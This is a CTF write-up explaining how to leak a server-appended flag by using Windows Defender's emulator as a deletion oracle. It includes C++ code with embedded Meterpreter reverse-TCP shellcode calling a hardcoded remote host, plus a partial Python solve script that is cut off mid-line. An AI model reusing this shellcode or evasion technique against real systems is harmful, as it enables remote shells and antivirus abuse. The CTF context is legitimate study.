In task, we have a simple LRU cache on disk written in Python. The name
heavily hints that the server is running with Windows Defender near, the hint
sends us back to WIndows Defender task where the solution was the JavaScript
deletion oracle. This time, JS won't work.

Every good antivirus has an x86 emulator these days, that's what immediately
came to my mind. It is called on new executable files when any disk operation
happens to them, for example, new file is saved to the disk. And what is the
100% trigger for the antivirus? One may think that EICAR string will suffice,
but it's not true, EICAR string should appear at the beginning of the file.
What we really need is some common shellcode, like Msfvenom's
`windows/x64/meterpreter/reverse_tcp`. Again, every good antivirus has
signatures for Msfvenom's shellcodes.

Back to the task, what is happening there? The app appends the flag to our
file before saving it do disk. How can we abuse it? First of all, WinAPI makes
it extremely easy to read our own executable. Now we can conditionally decrypt
and call the shellcode if, for example, last byte of our executable is less
then 0x40. If it is indeed less, then the shellcode will be decrypted in
emulator, trigger the signature, and file will be deleted (but the server will
return an UUID for this file). Consequently, trying to get this file will
return an HTTP 500 error (I don't really know why). If the shellcode was not
decrypted,  the file will be saved, and GET will return 200. That's our
oracle.

Additionally, since there are limits on emulator run time, I preemtively
optimized the payload binary, i.e., deleted all mentions of CRT, now the
execution starts immediately from my `main` function, and there is only one
function and one shellcode in the binary. As a consequence, no standard
library can be used. I added the `/NODEFAULTLIB` parameter to linker command
line and also set the entry point to `main` function. After that, the binary
size is 5 KB.

`payload.cpp`:  
``` cpp  
#define WIN32_LEAN_AND_MEAN  
#include <Windows.h>

// shellcode is encrypted by solve.py  
#pragma section(".text")  
__declspec(allocate(".text"))  
unsigned char shellcode[] = ""  
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"  
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"  
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"  
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"  
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"  
"\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"  
"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b"  
"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"  
"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1"  
"\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"  
"\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"  
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"  
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"  
"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"  
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"  
"\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"  
"\x49\xbc\x02\x00\x7a\x69\x89\x2d\xe4\x89\x41\x54\x49\x89\xe4"  
"\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"  
"\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"  
"\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"  
"\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"  
"\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"  
"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5"  
"\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9"  
"\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"  
"\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"  
"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"  
"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"  
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"  
"\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40"  
"\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5"  
"\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c"  
"\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41"  
"\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5";

int main() {  
   TCHAR path[MAX_PATH];  
   GetModuleFileName(NULL, path, MAX_PATH);  
   auto hFile = CreateFile(path, FILE_READ_DATA, FILE_SHARE_READ, NULL,
OPEN_EXISTING, 0, NULL);  
   SetFilePointer(hFile, -1, NULL, FILE_END);  // -1 here is patched by
solve.py  
   unsigned char c;  
   ReadFile(hFile, &c, 1, NULL, NULL);

   // debug output  
   auto stdout = GetStdHandle(STD_OUTPUT_HANDLE);  
   unsigned char x;  
   x = "0123456789ABCDEF"[c >> 4];  
   WriteFile(stdout, &x, 1, NULL, NULL);  
   x = "0123456789ABCDEF"[c & 15];  
   WriteFile(stdout, &x, 1, NULL, NULL);

   DWORD oldProtect;  
   if (!VirtualProtect((LPVOID)((ptrdiff_t)&shellcode & 0xFFFFFFFFFFFFF000LL),
0x1000, PAGE_EXECUTE_READWRITE, &oldProtect)) {  
       WriteFile(stdout, "VirtualProtect failed", 22, NULL, NULL);  
       return 0;  
   }  
   if (c <= 0x60) {                            // 0x60 here is patched by
solve.py  
       for (size_t i = 0; i < sizeof(shellcode); ++i) {  
           shellcode[i] ^= 0xAA;  
       }  
   }  
   ((void(*)())&shellcode)();  
   return 0;  
}  
```

`solve.py`:  
``` python  
#!/usr/bin/env python3  
import requests  
import sys  
import struct

HOST = 'http://angry-defender.zajebistyc.tf/cache'

def prepare(position, charcode):  
   with open('payload.exe', 'rb') as f:  
       q = f.read()  
   it =
q.find(b'\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52')  
   q = list(q)  
   for i in range(it, it + 511):       # encrypt shellcode  
       q[i] ^= 0xAA  
   q = bytes(q)  
   it = q.find(b'\x83\xF8\x60')  
   q = q[:it + 2] + struct.pack('B', charcode) + q[it + 3:]  
   q = q[:0x65B] + struct.pack('